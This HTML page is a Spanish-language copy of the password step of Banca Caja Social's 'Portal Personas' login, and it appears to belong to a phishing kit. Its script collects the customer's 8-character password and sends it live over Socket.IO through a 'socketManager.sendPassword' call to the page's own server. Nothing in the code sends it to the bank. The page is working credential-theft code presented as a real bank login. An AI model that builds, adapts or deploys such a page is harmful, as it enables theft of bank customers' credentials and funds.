<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contraseña - Portal Personas - Banca Caja Social</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999;display:none;justify-content:center;align-items:center;">
        <div style="text-align:center;">
            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;animation:pulse 1.5s ease-in-out infinite;">
        </div>
    </div>
    <style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}.loading-overlay.show{display:flex!important}</style>
    
    <div class="container">
        <div class="left-section">
            <img src="img/background-2.png" alt="Familia" class="background-image">
        </div>
        <div class="right-section">
            <div class="form-container">
                <div class="logo-container">
                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
                </div>
                
                <h1 class="title">Bienvenido al<br>Portal Personas</h1>
                
                <p class="subtitle">
                    Ingrese su contraseña de canales digitales,<br>
                    recuerde que está compuesta por <strong>8<br>
                    caracteres</strong>.
                </p>
                
                <form class="login-form" id="passwordForm">
                    <label for="password" class="form-label">Contraseña</label>
                    <div class="password-input-container">
                        <input 
                            type="password" 
                            id="password" 
                            name="password" 
                            class="form-input password-input"
                            maxlength="8"
                        >
                        <button type="button" class="toggle-password" aria-label="Mostrar contraseña">
                            <svg class="eye-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <g class="eye-group">
                                    <path class="eye-path" d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#666666"/>
                                    <line class="eye-slash" x1="4" y1="4" x2="20" y2="20" stroke="#666666" stroke-width="2" stroke-linecap="round"/>
                                </g>
                            </svg>
                        </button>
                    </div>
                    <p class="error-message" style="display: none;">Datos incorrectos. Verifique la longitud de su contraseña.</p>
                    
                    <button type="submit" class="btn-siguiente" id="btnContinuar" disabled>Iniciar sesión</button>
                    
                    <a href="#" class="link-password">¿Olvidó su contraseña? ▼</a>
                    
                    <div class="separator"></div>
                    
                    <p class="register-text">¿Es un cliente nuevo?</p>
                    <a href="#" class="link-register">Registrarse</a>
                    
                    <div class="back-link-container">
                        <a href="javascript:void(0)" onclick="window.location.href='index.html'" class="link-back">← Volver</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('password');
            const btnSiguiente = document.querySelector('.btn-siguiente');
            const togglePassword = document.querySelector('.toggle-password');
            
            const errorMessage = document.querySelector('.error-message');
            
            // Validación de contraseña - habilitar botón cuando tiene 8 caracteres
            passwordInput.addEventListener('input', function() {
                const value = this.value;
                
                // Ocultar mensaje de error mientras escribe
                errorMessage.style.display = 'none';
                
                if (value.length === 8) {
                    btnSiguiente.classList.add('enabled');
                    btnSiguiente.disabled = false;
                    btnSiguiente.removeAttribute('disabled');
                } else {
                    btnSiguiente.classList.remove('enabled');
                    btnSiguiente.disabled = true;
                    btnSiguiente.setAttribute('disabled', 'disabled');
                }
            });
            
            const eyeSlash = document.querySelector('.eye-slash');
            
            // Toggle mostrar/ocultar contraseña con animación mejorada
            togglePassword.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                
                // Animación del icono
                togglePassword.classList.add('toggle-active');
                setTimeout(() => {
                    togglePassword.classList.remove('toggle-active');
                }, 200);
                
                // Mostrar/ocultar línea diagonal
                if (type === 'text') {
                    eyeSlash.style.opacity = '1';
                    eyeSlash.style.transform = 'scale(1)';
                    togglePassword.setAttribute('aria-label', 'Ocultar contraseña');
                } else {
                    eyeSlash.style.opacity = '0';
                    eyeSlash.style.transform = 'scale(0)';
                    togglePassword.setAttribute('aria-label', 'Mostrar contraseña');
                }
            });
            
            // Enviar contraseña a través de Socket.IO
            document.querySelector('.login-form').addEventListener('submit', function(e) {
                e.preventDefault();
                const value = passwordInput.value;
                
                if (value.length !== 8) {
                    errorMessage.style.display = 'block';
                    passwordInput.classList.add('error');
                } else {
                    errorMessage.style.display = 'none';
                    passwordInput.classList.remove('error');
                    
                    // Enviar a través de Socket.IO
                    socketManager.sendPassword(value);
                }
            });
        });
    </script>
    
    <script src="/socket.io/socket.io.js"></script>


    <script src="/js/banco-utils.js"></script>
    <script src="client-optimized.js"></script>
</body>
</html>
